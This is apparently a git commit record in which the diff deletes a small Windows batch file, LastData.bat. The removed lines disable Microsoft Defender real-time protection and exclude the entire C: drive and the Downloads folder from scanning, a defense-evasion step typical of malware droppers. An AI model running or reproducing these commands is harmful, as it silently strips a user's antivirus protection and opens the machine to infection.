65aa78309446467b81abb69102a6dcd1c5386d80
Jeyrakh1 <ilesbalaev4@gmail.com>
2024-07-16 13:05:44 +0300

    Delete LastData.bat

--- LastData.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-powershell Set-MpPreference -DisableRealtimeMonitoring $true
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'"
